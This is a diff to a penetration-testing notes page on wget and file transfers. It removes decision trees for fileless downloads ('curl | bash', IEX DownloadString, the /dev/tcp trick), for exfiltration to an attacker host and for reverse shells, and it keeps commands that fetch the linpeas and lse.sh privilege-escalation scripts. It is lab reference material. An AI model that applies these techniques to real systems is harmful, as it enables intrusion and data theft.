@@ -49,7 +49,7 @@ wget http://TARGET_IP:8000/file.zip -O file.zip
 
 ## Notebook recipes
 
-19 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+17 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
 
@@ -139,49 +139,6 @@ wget -r ftp://anonymous:anonymous@<IP>/        # recursively mirror the whole se
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [FTP Enumeration and File Access — Enumeration workflow](/enumeration/ftp-enumeration-file-transfer-protocol#enumeration-workflow)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Quick Decision Tree">
-
-### Quick Decision Tree
-
-**File Transfers for Linux and Windows**
-
-```text
-DOWNLOADING TO WINDOWS:
-├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
-├── Only cmd.exe?       → certutil or bitsadmin
-├── Internal network?   → SMB (impacket-smbserver)
-├── Need fileless?      → IEX + DownloadString
-└── Nothing works?      → Base64 encode/decode via clipboard
-
-DOWNLOADING TO LINUX:
-├── Have curl/wget?     → Use them (simplest)
-├── Need fileless?      → curl | bash  or  wget -qO- | python3
-├── Have Python/PHP?    → Use language one-liners
-├── Nothing available?  → /dev/tcp bash trick
-└── Need encryption?    → OpenSSL s_server/s_client
-
-UPLOADING FROM WINDOWS:
-├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
-├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
-├── Internal network?   → SMB or WebDAV
-└── Nothing works?      → Base64 encode → copy-paste → decode on attacker
-
-UPLOADING FROM LINUX:
-├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
-├── Have SCP?           → scp file user@attacker:/path/
-├── Have Python?        → python3 requests.post one-liner
-└── Nothing works?      → Start python3 -m http.server on target, wget from attacker
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [File Transfers for Linux and Windows — Quick Decision Tree](/post-exploitation/file-transfers-cheat-sheet#quick-decision-tree)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -301,7 +258,7 @@ python3 -m http.server 80            # quick web server to transfer files
 
 **Linux Privilege Escalation: Full Checklist**
 
-```powershell
+```bash
 wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh
 curl "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -o linpeas.sh
 ./linpeas.sh -a #all checks - deeper system enumeration, but it takes longer to complete.
@@ -318,7 +275,7 @@ curl "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.s
 
 **Linux Privilege Escalation: Full Checklist**
 
-```powershell
+```bash
 wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh
 curl "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -o lse.sh
 ./lse.sh -l1 # shows interesting information that should help you to privesc
@@ -390,49 +347,6 @@ scp tool jbetty@<DMZ_IP>:/tmp/          # if you have SSH
 {/* VAULT_ORIGINAL_LINK_START */}
 
 **Original note sections:** [Pivoting and File Transfer: Field Reference — Downloading TO a Linux target](/cheatsheets/pivoting-file-transfer#downloading-to-a-linux-target)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
-<Accordion title="Mental Model — &quot;What Do I Use When?&quot;">
-
-### Mental Model — "What Do I Use When?"
-
-**Ports, Protocols, and Services by Purpose**
-
-```text
-"I found an open port"
-├── Is it a file share?    → SMB (445), NFS (2049), FTP (21)
-├── Is it remote access?   → SSH (22), RDP (3389), WinRM (5985)
-├── Is it a web server?    → HTTP (80/443) → fingerprint → fuzz
-├── Is it email?           → SMTP (25), IMAP (143), POP3 (110)
-├── Is it a database?      → MySQL (3306), MSSQL (1433), Oracle (1521)
-├── Is it monitoring?      → SNMP (161), IPMI (623)
-└── Not sure?              → nmap -sV -sC <IP> -p <port>
-
-"I need to get files off the target"
-├── Linux → scp/sftp (22)
-├── Windows → SMB (445) or evil-winrm download
-├── Web → wget/curl
-└── Simple → python3 -m http.server (on target)
-
-"I need to get files onto the target"
-├── Linux → scp/sftp (22) or wget from attacker
-├── Windows → SMB, certutil, PowerShell wget
-├── Web upload → if upload form exists
-└── Simple → python3 -m http.server (on attacker)
-
-"I need a shell"
-├── Linux → SSH (22)
-├── Windows → Evil-WinRM (5985), PsExec (445), RDP (3389)
-└── Either → reverse shell via exploit
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Ports, Protocols, and Services by Purpose — Mental Model — "What Do I Use When?"](/reference/master-protocol-service-quick-reference#mental-model-—-what-do-i-use-when)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -519,6 +433,8 @@ done
 - [Official documentation 1](https://www.gnu.org/software/wget/manual/wget.html)
 
 {/* VAULT_RELATED_START */}
+
+---
 
 **Source material and related references**
 
